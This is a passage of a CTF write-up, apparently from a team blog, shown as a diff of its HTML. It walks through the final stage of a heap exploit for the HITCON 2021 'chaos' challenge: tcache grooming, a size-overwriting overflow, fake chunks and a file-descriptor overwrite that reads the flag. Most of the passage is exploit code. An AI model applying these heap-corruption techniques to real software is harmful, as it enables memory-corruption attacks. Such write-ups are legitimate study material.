+    <span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">key_buf</span><span class="p">,</span> <span class="n">tree_node</span><span class="p">)</span> <span class="o">=</span> <span class="n">keys</span><span class="p">[</span><span class="n">key_id</span><span class="p">];</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">tree_node</span><span class="p">);</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">key_buf</span><span class="p">);</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Now our heap feng shui is written as:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">size_t</span> <span class="n">first</span> <span class="o">=</span> <span class="n">do_malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">);</span>
+
+<span class="kt">size_t</span> <span class="n">inp_prepare</span> <span class="o">=</span> <span class="n">do_malloc</span><span class="p">(</span><span class="mh">0x150</span><span class="p">);</span>
+<span class="kt">size_t</span> <span class="n">dont_free</span> <span class="o">=</span> <span class="n">do_malloc</span><span class="p">(</span><span class="mh">0x70</span><span class="p">);</span>
+<span class="kt">size_t</span> <span class="n">small</span> <span class="o">=</span> <span class="n">do_malloc</span><span class="p">(</span><span class="mh">0x50</span><span class="p">);</span>
+
+<span class="kt">size_t</span> <span class="n">reserved_for_later</span> <span class="o">=</span> <span class="n">do_malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">);</span>
+<span class="kt">size_t</span> <span class="n">reserved_for_later2</span> <span class="o">=</span> <span class="n">do_malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">);</span>
+
+<span class="n">do_free</span><span class="p">(</span><span class="n">dont_free</span><span class="p">);</span>
+<span class="n">do_free</span><span class="p">(</span><span class="n">first</span><span class="p">);</span>
+<span class="kt">size_t</span> <span class="n">dont_free2</span> <span class="o">=</span> <span class="n">do_malloc</span><span class="p">(</span><span class="mh">0x70</span><span class="p">);</span>
+<span class="kt">size_t</span> <span class="n">dont_free_begin</span> <span class="o">=</span> <span class="n">do_malloc</span><span class="p">(</span><span class="mh">0x90</span><span class="p">);</span>
+<span class="n">do_free</span><span class="p">(</span><span class="n">small</span><span class="p">);</span>
+<span class="n">do_free</span><span class="p">(</span><span class="n">dont_free_begin</span><span class="p">);</span>
+<span class="n">do_free</span><span class="p">(</span><span class="n">inp_prepare</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Since <code class="language-plaintext highlighter-rouge">do_malloc</code> first allocs a chunk of size 0x20, then our desired size, we can use it as a primitive for achieving the three parts of the heap we need, as long as the two mallocs happen from a contiguous region. Thankfully, the firmware was allocated as a large heap chunk and after freeing it, put in the unsorted bin. Therefore, as long as our allocation size’s tcache is empty, the malloc happens contiguously from this unsorted bin. Hence, our chunks from before can be identified:</p>
+
+<ul>
+  <li>$I_E$ ` = inp_prepare.buffer`</li>
+  <li>$O_E$ / $I_D$ ` = dont_free.buffer = dont_free_begin.buffer`</li>
+  <li>$O_D$ ` = small.buffer`</li>
+  <li>$L$ ` = inp_prepare.key_buf`</li>
+  <li>$D$ ` = dont_free.key_buf = dont_free2.key_buf`</li>
+  <li>$S$ ` = small.key_buf`</li>
+</ul>
+
+<p>This also explains the very first allocation. It is done to remove the single 0x20 chunk currently in the tcache.
+<code class="language-plaintext highlighter-rouge">inp_prepare</code> then corresponds to our first heap part, the first input buffer and the large chunk.
+<code class="language-plaintext highlighter-rouge">dont_free</code> corresponds to the second heap part, while <code class="language-plaintext highlighter-rouge">small</code> to the third.
+Both <code class="language-plaintext highlighter-rouge">reserved_for_later</code> use a key_buf chunk on the tcache, while the tree_node will be allocated just after our small chunk.
+This will be our target for overwriting with the controlled overflow later.</p>
+
+<p>Finally, we have to do some freeing to get our tcache in the correct order. In the end, we would like the have the following tcache for 0x20:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>head -&gt; inp_prepare.buffer -&gt; dont_free.buffer -&gt; small.buffer
+</code></pre></div></div>
+
+<p>To this end, we first swap the buffer struct used for <code class="language-plaintext highlighter-rouge">dont_free</code> and <code class="language-plaintext highlighter-rouge">first</code>. Otherwise, we would have to free <code class="language-plaintext highlighter-rouge">dont_free.key_buf</code>, which we do not want! For that, we first free it temporarily, leading to the following tcache 0x20:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>head -&gt; first.buffer -&gt; dont_free.buffer
+</code></pre></div></div>
+
+<p>Furthermore, <code class="language-plaintext highlighter-rouge">dont_free.key_buf</code> is the head of tcache 0x70. Therefore, <code class="language-plaintext highlighter-rouge">do_malloc(0x70)</code>, will use <code class="language-plaintext highlighter-rouge">first.buffer</code> as the buffer, and <code class="language-plaintext highlighter-rouge">dont_free.key_buf</code> as its key_buf. Since we never touch the result of this malloc (<code class="language-plaintext highlighter-rouge">dont_free2</code>) again, we can be safe that <code class="language-plaintext highlighter-rouge">dont_free.key_buf</code> (or as named above $D$) is never freed! Lastly, <code class="language-plaintext highlighter-rouge">dont_free_begin.buffer</code> now points to <code class="language-plaintext highlighter-rouge">dont_free.buffer</code> and hence the last three frees achieve exactly the tcache layout we want.</p>
+
+<p>Therefore, the next part of our exploit looks as follows:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">res</span> <span class="o">=</span> <span class="n">do_crypto</span><span class="p">(</span><span class="n">THREEFISH_ENC</span><span class="p">,</span> <span class="n">random_data</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="n">test_key_idx</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"enc failed"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">memcpy</span><span class="p">(</span><span class="n">temp_crypt</span><span class="p">,</span> <span class="n">crypt_result</span><span class="p">,</span> <span class="mi">24</span><span class="p">);</span>
+
+<span class="kt">size_t</span> <span class="n">rid_of_inp</span> <span class="o">=</span> <span class="n">do_malloc</span><span class="p">(</span><span class="mh">0x140</span><span class="p">);</span>
+
+<span class="n">res</span> <span class="o">=</span> <span class="n">do_crypto</span><span class="p">(</span><span class="n">THREEFISH_DEC</span><span class="p">,</span> <span class="n">temp_crypt</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="n">test_key_idx</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"dec failed"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">puts</span><span class="p">(</span><span class="s">"smashed size!"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>First we encrypt. This will use the first entry in the tcache as input, the second as output. Then we make sure to remove the first entry in the tcache. Next we decrypt, and again first entry in tcache is input (previously of course our output), the second as output. This all leads to our desired goal, of smashing the size of <code class="language-plaintext highlighter-rouge">small.key_buf</code> with <code class="language-plaintext highlighter-rouge">0x160</code>.</p>
+
+<p>We now malloc and free <code class="language-plaintext highlighter-rouge">small.key_buf</code>, to put it onto the correct tcache:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">size_t</span> <span class="n">small_smashed</span> <span class="o">=</span> <span class="n">do_malloc</span><span class="p">(</span><span class="mh">0x50</span><span class="p">);</span>
+<span class="n">do_free</span><span class="p">(</span><span class="n">small_smashed</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>The next time we add a key of size <code class="language-plaintext highlighter-rouge">0x150</code>, we will overflow <code class="language-plaintext highlighter-rouge">small.key_buf</code> by a lot!
+We now free the chunks reserved for later:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">do_free</span><span class="p">(</span><span class="n">reserved_for_later2</span><span class="p">);</span>
+<span class="n">do_free</span><span class="p">(</span><span class="n">reserved_for_later</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>This will now do the following for the tcache of size 0x40 (remember those chunk’s tree_node were allocated after <code class="language-plaintext highlighter-rouge">small.key_buf</code>):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>head -&gt; reserved_for_later.tree_node -&gt; reserved_for_later2.tree_node -&gt; ...
+</code></pre></div></div>
+
+<p>When we now overflow <code class="language-plaintext highlighter-rouge">small.key_buf</code>, we can set <code class="language-plaintext highlighter-rouge">fd</code> of the chunks that are in tcache.
+Due to the way the allocations work, we need to create some fake chunks first, which we point to.
+The fake chunks are created as follows inside dram:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">puts</span><span class="p">(</span><span class="s">"Creating fake chunks"</span><span class="p">);</span>
+
+<span class="kt">uint64_t</span><span class="o">*</span> <span class="n">fake_chunk</span> <span class="o">=</span> <span class="n">dram</span> <span class="o">+</span> <span class="mh">0x20000</span><span class="p">;</span>
+<span class="kt">uint64_t</span><span class="o">*</span> <span class="n">fake_chunk2</span> <span class="o">=</span> <span class="n">dram</span> <span class="o">+</span> <span class="mh">0x20080</span><span class="p">;</span>
+<span class="n">fake_chunk</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x41</span><span class="p">;</span>
+<span class="n">fake_chunk</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">fake_chunk2</span><span class="p">;</span>
+<span class="n">fake_chunk</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="n">fake_chunk2</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x41</span><span class="p">;</span>
+<span class="c1">// this is the address we actually wanna overwrite</span>
+<span class="n">fake_chunk2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">fd_addr</span><span class="p">;</span>
+<span class="n">fake_chunk2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="kt">uint64_t</span><span class="o">*</span> <span class="n">fake_chunk4</span> <span class="o">=</span> <span class="n">dram</span> <span class="o">+</span> <span class="mh">0x20100</span><span class="p">;</span>
+<span class="n">fake_chunk4</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x21</span><span class="p">;</span>
+<span class="n">fake_chunk4</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="n">fake_chunk4</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="kt">uint64_t</span><span class="o">*</span> <span class="n">fake_chunk3</span> <span class="o">=</span> <span class="n">dram</span> <span class="o">+</span> <span class="mh">0x20180</span><span class="p">;</span>
+<span class="n">fake_chunk3</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x21</span><span class="p">;</span>
+<span class="n">fake_chunk3</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">fake_chunk4</span><span class="p">;</span>
+<span class="n">fake_chunk3</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Now we can finally overflow:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">puts</span><span class="p">(</span><span class="s">"smashing actual chunks"</span><span class="p">);</span>
+
+<span class="n">memset</span><span class="p">(</span><span class="n">overwrite</span><span class="p">,</span> <span class="sc">'A'</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">overwrite</span><span class="p">));</span>
+
+<span class="kt">uint64_t</span><span class="o">*</span> <span class="n">over</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">overwrite</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+
+<span class="c1">// Due to the free of the reserved_for_later chunks</span>
+<span class="c1">// We also need to fixup these buffer chunks on the heap.</span>
+<span class="n">over</span><span class="p">[</span><span class="mi">31</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x21</span><span class="p">;</span>
+<span class="n">over</span><span class="p">[</span><span class="mi">32</span><span class="p">]</span> <span class="o">=</span> <span class="n">fake_chunk3</span><span class="p">;</span>
+<span class="n">over</span><span class="p">[</span><span class="mi">33</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="c1">// This is our actual target!</span>
+<span class="n">over</span><span class="p">[</span><span class="mi">23</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x41</span><span class="p">;</span>
+<span class="n">over</span><span class="p">[</span><span class="mi">24</span><span class="p">]</span> <span class="o">=</span> <span class="n">fake_chunk</span><span class="p">;</span>
+<span class="n">over</span><span class="p">[</span><span class="mi">25</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="kt">size_t</span> <span class="n">my_key</span> <span class="o">=</span> <span class="n">add_key</span><span class="p">(</span><span class="n">overwrite</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">overwrite</span><span class="p">));</span>
+</code></pre></div></div>
+
+<p>The tcache for 0x20 and 0x40 now looks as follows:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">head</span><span class="p">[</span><span class="mh">0x20</span><span class="p">]</span> <span class="o">-&gt;</span> <span class="n">reserver_for_later</span><span class="p">.</span><span class="n">buffer</span> <span class="o">-&gt;</span> <span class="n">fake_chunk3</span> <span class="o">-&gt;</span> <span class="n">fake_chunk4</span>
+<span class="n">head</span><span class="p">[</span><span class="mh">0x40</span><span class="p">]</span> <span class="o">-&gt;</span> <span class="n">fake_chunk</span> <span class="o">-&gt;</span> <span class="n">fake_chunk2</span> <span class="o">-&gt;</span> <span class="n">fd_addr</span> <span class="c1">// location of flag1 file descriptor</span>
+</code></pre></div></div>
+
+<p>Hence, if we create two keys of length 0x30, the second key allocation will be overwriting fd_addr, allowing us to change the file descriptor from flag1 to the one for flag3. Then we can just reuse our exploit for the first flag:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">uint32_t</span><span class="o">*</span> <span class="n">fd_over</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fd_overwrite</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="c1">// remote:</span>
+<span class="o">*</span><span class="n">fd_over</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="c1">// local:</span>
+<span class="c1">// *fd_over = 4;</span>
+<span class="kt">size_t</span> <span class="n">fd_key</span> <span class="o">=</span> <span class="n">add_key</span><span class="p">(</span><span class="n">fd_overwrite</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">);</span>
+<span class="kt">size_t</span> <span class="n">fd_key2</span> <span class="o">=</span> <span class="n">add_key</span><span class="p">(</span><span class="n">fd_overwrite</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">);</span>
+
+<span class="n">puts</span><span class="p">(</span><span class="s">"Read flag"</span><span class="p">);</span>
+
+<span class="k">while</span> <span class="p">(</span><span class="nb">true</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">syscall1</span><span class="p">(</span><span class="mh">0xC89FC</span><span class="p">,</span> <span class="n">dram</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"flag: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">dram</span><span class="p">);</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0x100</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x50000</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mh">0x100</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">memcpy</span><span class="p">(</span><span class="n">dram</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">dram</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">hitcon{threefishes~sandbox~esacape}</code></p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>Thanks to david942j and lyc for putting together this series of challenges, they were really fun to solve. You can find the source code for the challenges together with the official solution <a href="https://github.com/david942j/hitcon-2021-chaos">on github</a>. Until next time!</p>
+<div class="footnotes" role="doc-endnotes">
+  <ol>
+    <li id="fn:1" role="doc-endnote">
+      <p>Note that the mallocs will actually happen at different times, this is just to illustrate the basic idea. <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+  </ol>
+</div>
+
+
+
+
+<!--       <footer class="site-footer">
+        <a href="https://twitter.com/0rganizers">Twitter</a> | <a id="changeTheme" class="btn-toggle">Dark-Mode</a>
+      </footer> -->
+
+      <div class="lever-meme">
+        <div id="lever" class="lever-off"></div>
+      </div>
+
+      <div class="twitter">
+        <a href="https://twitter.com/0rganizers"><img src="/assets/images/twitter.svg"></a>
+      </div>
+
+      <script>
+        let leverCount = 0;
+        let manic = false;
+
+        function resetLever() {
+            leverCount = 0;
+            setTimeout(resetLever, 1750);
+        }
+
+        resetLever();
+
+        document.getElementById('lever')
+        .addEventListener('click', function (event) {
+          if(leverCount > 10){
+            manic = true;
+            document.getElementById("lever").classList.add('lever-manic');
+            document.getElementById("header-logo").classList.add('rainbow');
+          }
+
+          if(!manic){
+            document.getElementById("lever").classList.toggle('lever-on');
+            ++leverCount;
+          }
+        });
+
+
+      </script>
+
+      <script>
+      function updateThemeToggleFooter() {
+        let elem = document.querySelector('#lever');
+        // elem.innerHTML = isLightThemeSelected() ? 'Dark Mode' : 'Light Mode'
+      }
+
+      (function() {
+        updateThemeToggleFooter()
+      })();
+
+      function togglePageContentLightDark() {
+          var html = document.getElementsByTagName('html')[0]
+          var currentClass = html.className
+          var newClass = html.className == 'dark-theme' ? 'light-theme' : 'dark-theme'
+          html.className = newClass
+
+          document.cookie = 'theme=' + (newClass == 'light-theme' ? 'light' : 'dark') + '; SameSite=Strict; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT'
+          console.log('Cookies are now: ' + document.cookie)
+
+          updateThemeToggleFooter()
+      }
+
+      const btn = document.querySelector("#lever");
+      btn.addEventListener("click", function() {
+        togglePageContentLightDark();
+      });
+      </script>
+    </main>
+  </body>
+</html>
